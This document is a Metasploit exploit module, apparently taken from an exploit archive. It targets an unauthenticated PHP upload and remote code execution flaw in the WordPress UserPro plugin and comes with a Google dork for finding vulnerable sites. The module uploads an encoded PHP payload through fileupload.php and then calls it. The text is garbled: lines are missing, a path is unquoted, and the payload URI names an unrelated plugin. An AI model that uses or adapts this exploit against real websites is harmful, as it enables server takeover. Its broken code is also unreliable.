# Exploit Author : Ashiyane Digital Security Team
# Vendor Homepage : http://userproplugin.com/
# Google Dork : inurl:/wp-content/plugins/userpro/
# Date : 10/20/2016
# Tested on : Windows10/Linux
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary PHP code upload in the
    The vulnerability allows for unauthorization file
        upload and remote code execution.
      },
      &#039;Author&#039;         =>
        [
          &#039;T3rm!nat0r5&#039;,
          &#039;termijan <poyaterminator@gmail.com>&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;Ref&#039;, &#039;http://priv8.termijan/&#039;],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;userpro&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Oct 20 2016&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )
  end

  def check
    res = send_request_cgi(
&#039;userpro&#039;, &#039;lib&#039;, &#039;fileupload&#039;,&#039;fileupload.php&#039;)
    )

    if res && res.code == 200 && res.body =~ /Code Generator/ &&
res.body =~ /userpro/
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + &#039;.php&#039;
    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(wp-content, &#039;plugins&#039;,
                     &#039;userpro&#039;, &#039;lib&#039;, &#039;fileupload&#039; , &#039;fileupload.php&#039;),
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;vars_post&#039; =>
      {
        &#039;fileNamePattern&#039; => php_pagename,
        &#039;fileTemplate&#039;    => payload.encoded
      }
    })

    if res && res.code == 200 && res.body && res.body.to_s =~ /Creating File/
      print_good("#{peer} - Our payload is at: #{php_pagename}.
Calling payload...")
      register_files_for_cleanup(php_pagename)
    else
      fail_with("#{peer} - Unable deploy payload, server returned #{res.code}")
    end

    print_status("#{peer} - Calling payload ...")
    send_request_cgi({
                     &#039;Infusionsoft&#039;, &#039;utilities&#039;, php_pagename)
    }, 2)
  end

end
# Exploit by T3rm!nat0r5

